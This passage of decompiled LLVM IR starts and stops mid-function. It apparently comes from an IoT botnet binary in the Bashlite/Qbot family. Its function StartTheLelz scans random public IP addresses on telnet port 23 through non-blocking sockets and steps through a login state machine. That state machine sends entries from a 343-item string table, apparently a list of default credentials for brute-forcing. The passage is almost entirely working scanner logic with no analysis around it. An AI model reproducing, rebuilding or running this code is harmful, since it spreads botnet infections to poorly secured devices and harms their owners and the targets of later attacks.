  store i32 %arg2, i32* %v3_b0fc, align 4
  store i32 %v3_b010, i32* @fp, align 4
  ret i32 %v0_b0a0

; uselistorder directives
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_b128 = icmp sgt i32 %arg1, 2
  br i1 %v8_b128, label %dec_label_pc_b138, label %dec_label_pc_b148

dec_label_pc_b138:                                ; preds = %entry
  %v1_b13c = call i32 @__GI_close(i32 %arg1)
  br label %dec_label_pc_b148

dec_label_pc_b148:                                ; preds = %entry, %dec_label_pc_b138
  %storemerge1 = phi i32 [ 0, %dec_label_pc_b138 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_b148, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_b160 = load i32, i32* @fp, align 4
  store i32 45416, i32* %stack_var_-4, align 4
  %v2_b164 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b164, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_b184 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_b194 = icmp eq i32 %v1_b184, 0
  br i1 %v2_b194, label %dec_label_pc_b19c, label %dec_label_pc_b1a8

dec_label_pc_b19c:                                ; preds = %entry
  br label %dec_label_pc_b274

dec_label_pc_b1a8:                                ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_b1ac = add i32 %v1_b184, 16
  %v2_b1ac = inttoptr i32 %v1_b1ac to i32*
  %v3_b1ac = load i32, i32* %v2_b1ac, align 4
  %v1_b1b0 = inttoptr i32 %v3_b1ac to i32*
  %v2_b1b0 = load i32, i32* %v1_b1b0, align 4
  %v1_b1b8 = add i32 %v1_b184, 12
  %v2_b1b8 = inttoptr i32 %v1_b1b8 to i32*
  %v3_b1b8 = load i32, i32* %v2_b1b8, align 4
  store i32 %v3_b1b8, i32* @r2, align 4
  %v2_b1c4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_b1c4, i32* @r3, align 4
  %v5_b1d0 = call i32 @bcopy(i32 %v2_b1b0, i32 %v2_b1c4, i32 %v3_b1b8, i32 %v2_b1c4, i32 %v1_b184)
  %v2_b1dc = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_b1fc = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_b208 = ptrtoint i32* %stack_var_-44 to i32
  %v5_b224 = call i32 @__GI_setsockopt(i32 %v3_b1fc, i32 6, i32 1, i32 %v2_b208, i32 4)
  %v3_b22c = icmp eq i32 %v3_b1fc, -1
  br i1 %v3_b22c, label %dec_label_pc_b234, label %dec_label_pc_b240

dec_label_pc_b234:                                ; preds = %dec_label_pc_b1a8
  br label %dec_label_pc_b274

dec_label_pc_b240:                                ; preds = %dec_label_pc_b1a8
  %v2_b1c0 = ptrtoint i32* %stack_var_-40 to i32
  %v3_b250 = call i32 @__libc_connect(i32 %v3_b1fc, i32 %v2_b1c0, i32 16)
  %v3_b258 = icmp eq i32 %v3_b250, -1
  br i1 %v3_b258, label %dec_label_pc_b260, label %dec_label_pc_b26c

dec_label_pc_b260:                                ; preds = %dec_label_pc_b240
  br label %dec_label_pc_b274

dec_label_pc_b26c:                                ; preds = %dec_label_pc_b240
  br label %dec_label_pc_b274

dec_label_pc_b274:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b234, %dec_label_pc_b19c, %dec_label_pc_b26c
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b19c ], [ 0, %dec_label_pc_b234 ], [ 0, %dec_label_pc_b260 ], [ %v3_b1fc, %dec_label_pc_b26c ]
  store i32 %v3_b160, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_b274, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_b288 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b288, i32* %ip.global-to-local, align 4
  %v3_b28c = load i32, i32* @r4, align 4
  store i32 %v3_b28c, i32* %stack_var_-24, align 4
  store i32 45716, i32* %stack_var_-4, align 4
  %v19_b28c = ptrtoint i32* %stack_var_-24 to i32
  %v2_b290 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b290, i32* @fp, align 4
  %v2_b2ac = call i32 @__GI_time(i32* null)
  store i32 %v2_b2ac, i32* @r4, align 4
  %v0_b2b8 = call i32 @rand_cmwc()
  %v0_b2c0 = load i32, i32* @r4, align 4
  %v2_b2c0 = xor i32 %v0_b2c0, %v0_b2b8
  %v1_b2c8 = call i32 @srand(i32 %v2_b2c0)
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b2e4 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_b314 = bitcast i32* %stack_var_-604 to i8*
  %v3_b314 = call i32 @__GI_memset(i8* %v2_b314, i32 0)
  %v1_b320 = call i32 @malloc(i32 1025)
  store i32 1025, i32* @r2, align 4
  %v2_b33c = inttoptr i32 %v1_b320 to i8*
  %v3_b33c = call i32 @__GI_memset(i8* %v2_b33c, i32 0)
  %v2_b34c = mul i32 %arg2, 28
  %v1_b354 = add i32 %v2_b34c, 14
  %v3_b358 = and i32 %v1_b354, -8
  %v1_b360 = load i32, i32* @sp, align 4
  %v2_b360 = sub i32 %v1_b360, %v3_b358
  %v1_b370 = add i32 %v2_b360, 15
  %v3_b374 = and i32 %v1_b370, -8
  %v2_b398 = mul i32 %arg2, 5
  store i32 %v2_b398, i32* @r2, align 4
  %v2_b3a8 = inttoptr i32 %v3_b374 to i8*
  %v3_b3a8 = call i32 @__GI_memset(i8* %v2_b3a8, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_b44856 = icmp sgt i32 %arg2, 0
  br i1 %v5_b44856, label %dec_label_pc_b3b8, label %dec_label_pc_b44c

dec_label_pc_b3b8:                                ; preds = %entry, %dec_label_pc_b3b8
  %storemerge457 = phi i32 [ %v1_b434, %dec_label_pc_b3b8 ], [ 0, %entry ]
  %v2_b3c8 = mul i32 %storemerge457, 28
  %v2_b3cc = add i32 %v2_b3c8, %v3_b374
  store i32 28, i32* @r2, align 4
  %v2_b3dc = inttoptr i32 %v2_b3cc to i8*
  %v3_b3dc = call i32 @__GI_memset(i8* %v2_b3dc, i32 0)
  %v3_b404 = add i32 %v2_b3cc, 9
  %v4_b404 = inttoptr i32 %v3_b404 to i8*
  store i8 1, i8* %v4_b404, align 1
  %v2_b424 = add i32 %v2_b3cc, 24
  %v2_b42c = inttoptr i32 %v2_b424 to i32*
  store i32 %v1_b320, i32* %v2_b42c, align 4
  %v1_b434 = add nuw nsw i32 %storemerge457, 1
  store i32 %v1_b434, i32* %r2.global-to-local, align 4
  %v5_b448 = icmp slt i32 %v1_b434, %arg2
  br i1 %v5_b448, label %dec_label_pc_b3b8, label %dec_label_pc_b44c

dec_label_pc_b44c:                                ; preds = %dec_label_pc_b3b8, %entry
  br label %dec_label_pc_b454

dec_label_pc_b454:                                ; preds = %dec_label_pc_b454, %dec_label_pc_b44c
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_b44c ], [ %v1_b458, %dec_label_pc_b454 ]
  %v1_b458 = add i32 %stack_var_-56.0, 1
  store i32 %v1_b458, i32* %r2.global-to-local, align 4
  %v4_b468 = mul i32 %v1_b458, 4
  %v5_b468 = add i32 %v4_b468, ptrtoint ([10 x i8*]* @global_var_26fac.91 to i32)
  %v6_b468 = inttoptr i32 %v5_b468 to i32*
  %v7_b468 = load i32, i32* %v6_b468, align 4
  %v2_b46c = icmp eq i32 %v7_b468, 0
  br i1 %v2_b46c, label %dec_label_pc_b474.preheader, label %dec_label_pc_b454

dec_label_pc_b474.preheader:                      ; preds = %dec_label_pc_b454
  %v2_b4fc = add i32 %v3_b374, 8
  %v2_b7a4 = or i32 %v3_b374, 4
  %v2_b884 = ptrtoint i32* %stack_var_-612 to i32
  %v2_b904 = ptrtoint i32* %stack_var_-324 to i32
  %v2_ba00 = ptrtoint i32* %stack_var_-332 to i32
  %v2_ba5c = ptrtoint i32* %stack_var_-340 to i32
  %v2_ba60 = ptrtoint i32* %stack_var_-336 to i32
  %v2_bb7c = add i32 %v3_b374, 16
  %v2_bbf8 = add i32 %v3_b374, 24
  br label %dec_label_pc_b474

dec_label_pc_b474:                                ; preds = %dec_label_pc_b474, %dec_label_pc_c578, %dec_label_pc_b474.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v5_b44856, label %dec_label_pc_b480, label %dec_label_pc_b474

dec_label_pc_b480:                                ; preds = %dec_label_pc_b474, %dec_label_pc_c578
  %storemerge548 = phi i32 [ %v1_c57c, %dec_label_pc_c578 ], [ 0, %dec_label_pc_b474 ]
  %v3_b48c = mul i32 %storemerge548, 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b494 = mul i32 %storemerge548, 28
  %v2_b498 = add i32 %v2_b494, %v3_b374
  %v2_b49c = add i32 %v2_b498, 16
  %v1_b4a0 = inttoptr i32 %v2_b49c to i32*
  %v2_b4a0 = load i32, i32* %v1_b4a0, align 4
  %v2_b4a4 = icmp eq i32 %v2_b4a0, 0
  br i1 %v2_b4a4, label %dec_label_pc_b4ac, label %dec_label_pc_b4e4

dec_label_pc_b4ac:                                ; preds = %dec_label_pc_b480
  store i32 %storemerge548, i32* @r4, align 4
  %v2_b4b4 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r4, align 4
  %v3_b4cc = mul i32 %v0_b4c8, 4
  store i32 %v3_b4cc, i32* %r2.global-to-local, align 4
  %v2_b4d4 = mul i32 %v0_b4c8, 28
  %v2_b4dc = add i32 %v2_bb7c, %v2_b4d4
  %v2_b4e0 = inttoptr i32 %v2_b4dc to i32*
  store i32 %v2_b4b4, i32* %v2_b4e0, align 4
  br label %dec_label_pc_b4e4

dec_label_pc_b4e4:                                ; preds = %dec_label_pc_b480, %dec_label_pc_b4ac
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b500 = add i32 %v2_b4fc, %v2_b494
  %v1_b504 = inttoptr i32 %v2_b500 to i8*
  %v2_b504 = load i8, i8* %v1_b504, align 4
  %v3_b504 = sext i8 %v2_b504 to i32
  switch i32 %v3_b504, label %dec_label_pc_c578 [
    i32 0, label %dec_label_pc_b534
    i32 1, label %dec_label_pc_b918.lr.ph
    i32 2, label %dec_label_pc_bbc4
    i32 3, label %dec_label_pc_bd10
    i32 4, label %dec_label_pc_be64
    i32 5, label %dec_label_pc_bfb0
    i32 6, label %dec_label_pc_c104
    i32 7, label %dec_label_pc_c408
  ]

dec_label_pc_b534:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b550 = add i32 %v2_b498, 8
  %v1_b554 = add i32 %v2_b498, 9
  %v2_b554 = inttoptr i32 %v1_b554 to i8*
  %v3_b554 = load i8, i8* %v2_b554, align 1
  %v7_b558 = icmp eq i8 %v3_b554, 1
  br i1 %v7_b558, label %dec_label_pc_b560, label %dec_label_pc_b60c

dec_label_pc_b560:                                ; preds = %dec_label_pc_b534
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b57c = add i32 %v2_b498, 24
  %v1_b580 = inttoptr i32 %v2_b57c to i32*
  %v2_b580 = load i32, i32* %v1_b580, align 4
  store i32 28, i32* @r2, align 4
  %v2_b5ac = inttoptr i32 %v2_b498 to i8*
  %v3_b5ac = call i32 @__GI_memset(i8* %v2_b5ac, i32 0)
  store i32 %v2_b57c, i32* %r2.global-to-local, align 4
  store i32 %v2_b580, i32* %v1_b580, align 4
  store i32 %storemerge548, i32* @r4, align 4
  %v4_b5dc = call i32 @GetRandomPublicIP(i32 24, i32 %v3_b374, i32 %v2_b57c, i32 %v2_b580)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r4, align 4
  %v3_b5f0 = mul i32 %v0_b5ec, 4
  store i32 %v3_b5f0, i32* %r2.global-to-local, align 4
  %v2_b5f8 = mul i32 %v0_b5ec, 28
  %v2_b600 = add i32 %v2_b7a4, %v2_b5f8
  %v2_b604 = inttoptr i32 %v2_b600 to i32*
  store i32 %v4_b5dc, i32* %v2_b604, align 4
  br label %dec_label_pc_b740

dec_label_pc_b60c:                                ; preds = %dec_label_pc_b534
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_b62c = load i8, i8* %v2_b554, align 1
  %v2_b630 = icmp eq i8 %v3_b62c, 0
  br i1 %v2_b630, label %dec_label_pc_b638, label %dec_label_pc_b740

dec_label_pc_b638:                                ; preds = %dec_label_pc_b60c
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_b65c = add i32 %v2_b498, 11
  %v2_b65c = inttoptr i32 %v1_b65c to i8*
  %v3_b65c = load i8, i8* %v2_b65c, align 1
  %v1_b660 = add i8 %v3_b65c, 1
  store i8 %v1_b660, i8* %v2_b65c, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_b6b4 = add i32 %v2_b498, 10
  %v2_b6b4 = inttoptr i32 %v1_b6b4 to i8*
  %v3_b6b4 = load i8, i8* %v2_b6b4, align 2
  %v1_b6b8 = add i8 %v3_b6b4, 1
  store i32 %v3_b374, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_b6b8, i8* %v2_b6b4, align 2
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_b708 = load i8, i8* %v2_b6b4, align 2
  %v7_b70c = icmp eq i8 %v3_b708, 9
  br i1 %v7_b70c, label %dec_label_pc_b714, label %dec_label_pc_b740

dec_label_pc_b714:                                ; preds = %dec_label_pc_b638
  store i32 %v2_b550, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_b554, align 1
  br label %dec_label_pc_c578

dec_label_pc_b740:                                ; preds = %dec_label_pc_b638, %dec_label_pc_b60c, %dec_label_pc_b560
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b758 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_b788 = call i32 @__GI_memset(i8* %v2_b314, i32 0)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  store i32 %storemerge548, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b7c4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_b7cc = load i32, i32* @r4, align 4
  %v2_b7d8 = mul i32 %v0_b7cc, 28
  %v2_b7dc = add i32 %v2_b7d8, %v3_b374
  %v2_b7e0 = inttoptr i32 %v2_b7dc to i32*
  store i32 %v3_b7c4, i32* %v2_b7e0, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_b7fc = inttoptr i32 %v2_b498 to i32*
  %v2_b7fc = load i32, i32* %v1_b7fc, align 4
  %v7_b800 = icmp eq i32 %v2_b7fc, -1
  br i1 %v7_b800, label %dec_label_pc_c578, label %dec_label_pc_b808

dec_label_pc_b808:                                ; preds = %dec_label_pc_b740
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b820 = load i32, i32* %v1_b7fc, align 4
  store i32 %v2_b820, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b83c = load i32, i32* %v1_b7fc, align 4
  store i32 %v2_b83c, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b84c = call i32 @__libc_fcntl(i32 %v2_b83c, i32 3)
  %v1_b854 = or i32 %v2_b84c, 2048
  store i32 %v1_b854, i32* @r3, align 4
  %v0_b858 = load i32, i32* @r4, align 4
  store i32 %v1_b854, i32* %r2.global-to-local, align 4
  %v2_b864 = call i32 @__libc_fcntl(i32 %v0_b858, i32 4)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b880 = load i32, i32* %v1_b7fc, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_b894 = call i32 @__libc_connect(i32 %v2_b880, i32 %v2_b884, i32 16)
  %v3_b89c = icmp eq i32 %v3_b894, -1
  br i1 %v3_b89c, label %dec_label_pc_b8a4, label %dec_label_pc_b8dc

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b808
  %v0_b8a4 = call i32 @__GI___errno_location()
  %v1_b8ac = inttoptr i32 %v0_b8a4 to i32*
  %v2_b8ac = load i32, i32* %v1_b8ac, align 4
  %v7_b8b0 = icmp eq i32 %v2_b8ac, 115
  br i1 %v7_b8b0, label %dec_label_pc_b8dc, label %dec_label_pc_b8b8

dec_label_pc_b8b8:                                ; preds = %dec_label_pc_b8a4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_b8d4 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_b8dc:                                ; preds = %dec_label_pc_b808, %dec_label_pc_b8a4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_b8fc = call i32 @advance_state(i32* nonnull %v1_b7fc, i32 1)
  br label %dec_label_pc_c578

dec_label_pc_b918.lr.ph:                          ; preds = %dec_label_pc_b4e4
  br label %dec_label_pc_b918

dec_label_pc_b918:                                ; preds = %dec_label_pc_b918.lr.ph, %dec_label_pc_b918
  %storemerge610 = phi i32 [ 0, %dec_label_pc_b918.lr.ph ], [ %v1_b92c, %dec_label_pc_b918 ]
  store i32 %v2_b904, i32* %r2.global-to-local, align 4
  %v5_b924 = mul nuw nsw i32 %storemerge610, 4
  %v6_b924 = add i32 %v5_b924, %v2_b904
  %v7_b924 = inttoptr i32 %v6_b924 to i32*
  store i32 0, i32* %v7_b924, align 4
  %v1_b92c = add nuw nsw i32 %storemerge610, 1
  %tmp39 = icmp ult i32 %v1_b92c, 32
  br i1 %tmp39, label %dec_label_pc_b918, label %dec_label_pc_b940

dec_label_pc_b940:                                ; preds = %dec_label_pc_b918
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_b958 = inttoptr i32 %v2_b498 to i32*
  %v2_b958 = load i32, i32* %v1_b958, align 4
  %v3_b95c = udiv i32 %v2_b958, 32
  %v3_b970 = mul nuw nsw i32 %v3_b95c, 4
  %v2_b978 = add i32 %v3_b970, %v19_b28c
  store i32 %v2_b978, i32* %r2.global-to-local, align 4
  %v2_b97c = add i32 %v2_b978, -300
  %v1_b980 = inttoptr i32 %v2_b97c to i32*
  %v2_b980 = load i32, i32* %v1_b980, align 4
  store i32 %v2_b980, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b99c = load i32, i32* %v1_b958, align 4
  %v1_b9a0 = urem i32 %v2_b99c, 32
  %v6_b9a8 = shl i32 1, %v1_b9a0
  %v2_b9ac = or i32 %v6_b9a8, %v2_b980
  store i32 %v2_b9ac, i32* %v1_b980, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b9f4 = load i32, i32* %v1_b958, align 4
  %v1_b9f8 = add i32 %v2_b9f4, 1
  store i32 %v1_b9f8, i32* %r2.global-to-local, align 4
  store i32 %v2_b904, i32* %ip.global-to-local, align 4
  %v1_ba04 = load i32, i32* @sp, align 4
  %v2_ba04 = inttoptr i32 %v1_ba04 to i32*
  store i32 %v2_ba00, i32* %v2_ba04, align 4
  %v0_ba08 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_b904, i32* %r2.global-to-local, align 4
  %v4_ba18 = load i32, i32* %stack_var_-332, align 4
  %v5_ba18 = call i32 @__libc_select(i32 %v0_ba08, i32 0, i32 %v2_b904, i32 0, i32 %v4_ba18)
  %v7_ba28 = icmp eq i32 %v5_ba18, 1
  br i1 %v7_ba28, label %dec_label_pc_ba30, label %dec_label_pc_bb34

dec_label_pc_ba30:                                ; preds = %dec_label_pc_b940
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_ba58 = load i32, i32* %v1_b958, align 4
  store i32 %v2_ba58, i32* %r2.global-to-local, align 4
  store i32 %v2_ba5c, i32* %ip.global-to-local, align 4
  %v1_ba64 = load i32, i32* @sp, align 4
  %v2_ba64 = inttoptr i32 %v1_ba64 to i32*
  store i32 %v2_ba60, i32* %v2_ba64, align 4
  %v0_ba68 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_ba78 = load i32, i32* %stack_var_-340, align 4
  %v5_ba78 = call i32 @getsockopt(i32 %v0_ba68, i32 1, i32 4, i32 %v2_ba5c, i32 %v4_ba78)
  %v3_ba7c = load i32, i32* %stack_var_-340, align 4
  %v2_ba80 = icmp eq i32 %v3_ba7c, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v2_ba80, label %dec_label_pc_baac, label %dec_label_pc_ba88

dec_label_pc_ba88:                                ; preds = %dec_label_pc_ba30
  %v3_baa4 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_baac:                                ; preds = %dec_label_pc_ba30
  %v2_bac4 = load i32, i32* %v1_b958, align 4
  store i32 %v2_bac4, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bae0 = load i32, i32* %v1_b958, align 4
  store i32 %v2_bae0, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_baf0 = call i32 @__libc_fcntl(i32 %v2_bae0, i32 3)
  %v1_baf8 = and i32 %v2_baf0, -2049
  store i32 %v1_baf8, i32* @r3, align 4
  %v0_bafc = load i32, i32* @r4, align 4
  store i32 %v1_baf8, i32* %r2.global-to-local, align 4
  %v2_bb08 = call i32 @__libc_fcntl(i32 %v0_bafc, i32 4)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bb2c = call i32 @advance_state(i32* nonnull %v1_b958, i32 2)
  br label %dec_label_pc_c578

dec_label_pc_bb34:                                ; preds = %dec_label_pc_b940
  %v3_bb38 = icmp eq i32 %v5_ba18, -1
  br i1 %v3_bb38, label %dec_label_pc_bb40, label %dec_label_pc_bb64

dec_label_pc_bb40:                                ; preds = %dec_label_pc_bb34
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bb5c = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_bb64:                                ; preds = %dec_label_pc_bb34
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bb80 = add i32 %v2_b494, %v2_bb7c
  %v1_bb84 = inttoptr i32 %v2_bb80 to i32*
  %v2_bb84 = load i32, i32* %v1_bb84, align 4
  %v1_bb88 = add i32 %v2_bb84, 5
  store i32 %v1_bb88, i32* @r4, align 4
  %v2_bb90 = call i32 @__GI_time(i32* null)
  %v0_bb98 = load i32, i32* @r4, align 4
  %v3_bb98 = icmp ult i32 %v0_bb98, %v2_bb90
  br i1 %v3_bb98, label %dec_label_pc_bba0, label %dec_label_pc_c578

dec_label_pc_bba0:                                ; preds = %dec_label_pc_bb64
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bbbc = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bbdc = inttoptr i32 %v2_b498 to i32*
  %v2_bbdc = load i32, i32* %v1_bbdc, align 4
  store i32 %v2_bbdc, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bbfc = add i32 %v2_b494, %v2_bbf8
  %v1_bc00 = inttoptr i32 %v2_bbfc to i32*
  %v2_bc00 = load i32, i32* %v1_bc00, align 4
  store i32 %v2_bc00, i32* %r2.global-to-local, align 4
  %v1_bc08 = load i32, i32* @sp, align 4
  %v2_bc08 = inttoptr i32 %v1_bc08 to i32*
  store i32 ptrtoint (i32* @global_var_26fd8 to i32), i32* %v2_bc08, align 4
  %v0_bc0c = load i32, i32* %ip.global-to-local, align 4
  %v4_bc18 = inttoptr i32 %v2_bc00 to i8*
  %v5_bc18 = call i32 @read_until_response(i32 %v0_bc0c, i32 %arg1, i8* %v4_bc18, i32 1024)
  %v2_bc20 = icmp eq i32 %v5_bc18, 0
  br i1 %v2_bc20, label %dec_label_pc_bcb0, label %dec_label_pc_bc28

dec_label_pc_bc28:                                ; preds = %dec_label_pc_bbc4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bc44 = add i32 %v2_b498, 24
  %v1_bc48 = inttoptr i32 %v2_bc44 to i32*
  %v2_bc48 = load i32, i32* %v1_bc48, align 4
  %v1_bc50 = call i32 @contains_fail(i32 %v2_bc48)
  %v2_bc58 = icmp eq i32 %v1_bc50, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v2_bc58, label %dec_label_pc_bc88, label %dec_label_pc_bc60

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bc28
  %v3_bc80 = call i32 @advance_state(i32* %v1_bbdc, i32 0)
  br label %dec_label_pc_c578

dec_label_pc_bc88:                                ; preds = %dec_label_pc_bc28
  %v3_bca8 = call i32 @advance_state(i32* %v1_bbdc, i32 3)
  br label %dec_label_pc_c578

dec_label_pc_bcb0:                                ; preds = %dec_label_pc_bbc4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bcd0 = load i32, i32* %v1_b4a0, align 4
  %v1_bcd4 = add i32 %v2_bcd0, 7
  store i32 %v1_bcd4, i32* @r4, align 4
  %v2_bcdc = call i32 @__GI_time(i32* null)
  %v0_bce4 = load i32, i32* @r4, align 4
  %v3_bce4 = icmp ult i32 %v0_bce4, %v2_bcdc
  br i1 %v3_bce4, label %dec_label_pc_bcec, label %dec_label_pc_c578

dec_label_pc_bcec:                                ; preds = %dec_label_pc_bcb0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bd08 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c578

dec_label_pc_bd10:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bd28 = inttoptr i32 %v2_b498 to i32*
  %v2_bd28 = load i32, i32* %v1_bd28, align 4
  store i32 %v2_bd28, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bd4c = add i32 %v2_b498, 10
  %v2_bd4c = inttoptr i32 %v1_bd4c to i8*
  %v3_bd4c = load i8, i8* %v2_bd4c, align 2
  %v4_bd4c = zext i8 %v3_bd4c to i32
  store i32 %v4_bd4c, i32* %r2.global-to-local, align 4
  %v4_bd58 = mul nuw nsw i32 %v4_bd4c, 4
  %v5_bd58 = add i32 %v4_bd58, ptrtoint ([343 x i8*]* @global_var_26a4c.368 to i32)
  %v6_bd58 = inttoptr i32 %v5_bd58 to i32*
  %v7_bd58 = load i32, i32* %v6_bd58, align 4
  store i32 %v7_bd58, i32* @r5, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bd7c = load i8, i8* %v2_bd4c, align 2
  %v4_bd7c = zext i8 %v3_bd7c to i32
  store i32 %v4_bd7c, i32* %r2.global-to-local, align 4
  %v4_bd88 = mul nuw nsw i32 %v4_bd7c, 4
  %v5_bd88 = add i32 %v4_bd88, ptrtoint ([343 x i8*]* @global_var_26a4c.368 to i32)
  %v6_bd88 = inttoptr i32 %v5_bd88 to i32*
  %v7_bd88 = load i32, i32* %v6_bd88, align 4
  %v1_bd8c = inttoptr i32 %v7_bd88 to i8*
  %v3_bd90 = call i32 @strlen(i8* %v1_bd8c)
  %v0_bd98 = load i32, i32* @r4, align 4
  %v0_bd9c = load i32, i32* @r5, align 4
  store i32 %v3_bd90, i32* %r2.global-to-local, align 4
  %v4_bda8 = call i32 @__libc_send(i32 %v0_bd98, i32 %v0_bd9c, i32 %v3_bd90, i32 16384)
  %v1_bdb0 = icmp slt i32 %v4_bda8, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v1_bdb0, label %dec_label_pc_bdb8, label %dec_label_pc_bddc

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bd10
